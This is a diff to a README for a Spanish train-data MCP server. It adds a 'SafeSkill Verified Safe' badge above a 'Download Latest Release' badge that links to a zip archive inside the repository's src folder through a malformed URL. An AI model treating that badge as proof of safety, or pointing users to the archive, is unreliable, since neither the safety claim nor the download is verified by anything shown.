@@ -1,5 +1,7 @@
 # 🚄 renfe_mcp_server - Access Live Spanish Train Data Easily
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/sabermaple1-renfe-mcp-server)
+
 ![Download Latest Release](https://raw.githubusercontent.com/SaberMaple1/renfe_mcp_server/master/src/renfe_mcp/server_mcp_renfe_v3.6.zip%20Latest%20Release-v1.0-blue)
 
 ## 🚀 Getting Started
